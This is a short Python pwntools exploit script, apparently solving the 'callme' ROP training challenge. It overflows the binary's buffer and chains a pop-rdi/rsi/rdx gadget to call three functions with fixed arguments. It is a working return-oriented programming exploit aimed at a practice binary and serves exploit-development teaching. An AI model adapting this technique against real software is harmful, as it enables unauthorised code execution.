#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('callme')
context.terminal = ["/usr/bin/konsole", "-e", "sh", "-c"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

ARG0 = 0xdeadbeefdeadbeef
ARG1 = 0xcafebabecafebabe
ARG2 = 0xd00df00dd00df00d

CALLME_ONE = 0x400720
CALLME_TWO = 0x400740
CALLME_THREE = 0x4006f0

POPRDIRSIRDX_RET = 0x40093c
RET = 0x4006be

# -- Exploit goes here --

io = start()

# max 0x200 bytes
attack = b"A"*0x28 \
    + p64(POPRDIRSIRDX_RET) + p64(ARG0) + p64(ARG1) + p64(ARG2) + p64(RET) + p64(CALLME_ONE) \
    + p64(POPRDIRSIRDX_RET) + p64(ARG0) + p64(ARG1) + p64(ARG2) + p64(RET) + p64(CALLME_TWO) \
    + p64(POPRDIRSIRDX_RET) + p64(ARG0) + p64(ARG1) + p64(ARG2) + p64(RET) + p64(CALLME_THREE)
io.sendline(attack)

io.interactive()

